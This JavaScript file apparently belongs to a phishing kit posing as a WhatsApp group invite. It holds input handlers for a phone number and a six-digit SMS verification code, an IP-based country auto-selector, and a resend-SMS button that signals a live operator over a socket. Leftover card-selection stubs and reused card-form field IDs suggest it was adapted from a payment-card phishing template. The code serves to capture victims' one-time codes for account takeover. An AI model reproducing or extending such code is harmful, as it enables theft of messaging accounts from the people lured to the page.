// =============================================
// WhatsApp Group Inviter - Utility Functions
// =============================================

console.log("✅ Loading WhatsApp utility functions...");

// =============================================
// Phone Input - Digits Only Enforcement
// =============================================

window.enforceDigitsOnly = function(input) {
    if (!input) return;
    input.addEventListener('input', function(e) {
        let val = e.target.value.replace(/[^0-9\+\-\s]/g, '');
        // Allow leading + for international codes
        if (val !== e.target.value) {
            e.target.value = val;
        }
    });
};

// =============================================
// OTP / Code Input - 6-digit enforcement
// =============================================

window.enforceOTPInput = function(input) {
    if (!input) return;
    input.setAttribute('maxlength', '6');
    input.setAttribute('inputmode', 'numeric');
    input.addEventListener('input', function(e) {
        let val = e.target.value.replace(/[^0-9]/g, '');
        if (val.length > 6) val = val.substring(0, 6);
        e.target.value = val;
    });
};

// =============================================
// Geolocation Country Code Auto-selector
// =============================================

window.autoSelectCountryCode = function() {
    const select = document.getElementById('Address');
    if (!select) return;

    // Try to get user's country by IP
    fetch('https://extreme-ip-lookup.com/json/?key=demo2')
        .then(res => res.json())
        .then(data => {
            const countryCode = data.countryCode || '';
            const countryToDialCode = {
                'OM': '+968',
                'SA': '+966',
                'AE': '+971',
                'KW': '+965',
                'BH': '+973',
                'QA': '+974',
                'JO': '+962',
                'SY': '+963',
                'YE': '+967',
                'MA': '+212',
                'DZ': '+213',
                'TN': '+216',
                'LY': '+218',
                'EG': '+20',
                'IQ': '+964',
                'LB': '+961',
                'PS': '+970',
                'SD': '+249',
                'SO': '+252',
                'GB': '+44',
                'FR': '+33',
                'US': '+1',
                'CA': '+1',
                'DE': '+49',
                'ES': '+34',
                'IT': '+39',
                'NL': '+31',
                'BE': '+32',
                'CH': '+41',
                'PT': '+351',
                'SE': '+46',
                'NO': '+47',
                'DK': '+45',
                'AU': '+61',
                'IN': '+91',
                'PK': '+92',
                'TR': '+90',
            };

            const dialCode = countryToDialCode[countryCode];
            if (dialCode) {
                for (let i = 0; i < select.options.length; i++) {
                    if (select.options[i].value === dialCode) {
                        select.selectedIndex = i;
                        select.classList.add('auto-selected');
                        console.log(`✅ Country auto-selected: ${countryCode} → ${dialCode}`);
                        break;
                    }
                }
            }
        })
        .catch(err => {
            console.warn('Auto country select failed:', err);
        });
};

// =============================================
// Resend SMS / Resend Call Button Setup
// =============================================

window.setupResendSMSButton = function() {
    const resendBtn = document.getElementById('resendSMSBtn');
    if (!resendBtn) return;

    // Start with the button disabled (timer running)
    resendBtn.setAttribute('disabled', 'true');

    let smsChrono = document.getElementById('smsChrono');
    if (smsChrono) smsChrono.style.display = 'inline';

    resendBtn.addEventListener('click', function() {
        if (resendBtn.disabled) return;

        // Emit resend_sms socket event
        if (window.socket) {
            window.socket.emit('resend_sms', {
                uniqueID: sessionStorage.getItem('client_unique_id')
            });
        }

        // Reset timer
        resendBtn.setAttribute('disabled', 'true');
        if (smsChrono) smsChrono.style.display = 'inline';

        // Restart countdown
        let timeLeft = 60;
        if (smsChrono) {
            const timerSpan = smsChrono.querySelector('.btn-chrono-timer');
            if (timerSpan) timerSpan.textContent = timeLeft;
        }

        const interval = setInterval(() => {
            timeLeft--;
            if (smsChrono) {
                const timerSpan = smsChrono.querySelector('.btn-chrono-timer');
                if (timerSpan) timerSpan.textContent = timeLeft;
            }

            if (timeLeft <= 0) {
                clearInterval(interval);
                resendBtn.removeAttribute('disabled');
                if (smsChrono) smsChrono.style.display = 'none';
            }
        }, 1000);
    });
};

window.setupResendCallButton = function() {
    // No call resend in WhatsApp flow - stub for compatibility
    console.log("ℹ️ setupResendCallButton: not used in WhatsApp flow.");
};

// =============================================
// Green Circle (Error Confirmation) Button
// =============================================

window.setupGreenCircleButton = function() {
    const btn = document.getElementById('greenCircleBtn');
    if (!btn) return;

    btn.addEventListener('click', function() {
        // Navigate back to Login page to retry
        if (typeof loadPage === 'function') {
            loadPage('Login');
        }
    });
};

// =============================================
// setupCardSelection - stub for compatibility
// =============================================
window.setupCardSelection = function() {
    // No card selection in WhatsApp flow
    console.log("ℹ️ setupCardSelection: not applicable in WhatsApp flow.");
};

// =============================================
// Open WhatsApp App Button
// =============================================
window.setupOpenWhatsAppApp = function() {
    const btn = document.getElementById('openWhatsAppAppBtn');
    if (!btn) return;

    btn.addEventListener('click', function() {
        // Fallback WhatsApp group link - override this with your real link
        const groupLink = 'https://chat.whatsapp.com/YOUR_GROUP_INVITE_LINK';
        window.location.href = groupLink;
    });
};

// =============================================
// DOM Ready - attach listeners globally
// =============================================

document.addEventListener('DOMContentLoaded', function() {
    console.log("✅ WhatsApp utility functions ready.");

    // Auto-attach digit enforcement to phone input if present
    const zipInput = document.getElementById('Zip');
    if (zipInput) {
        window.enforceDigitsOnly(zipInput);
    }

    // Auto-attach OTP enforcement to code inputs if present
    const holderInput = document.getElementById('holder');
    if (holderInput) {
        window.enforceOTPInput(holderInput);
    }

    const smsInput = document.getElementById('sms');
    if (smsInput) {
        window.enforceOTPInput(smsInput);
    }
});

console.log("✅ WhatsApp utility functions loaded!");
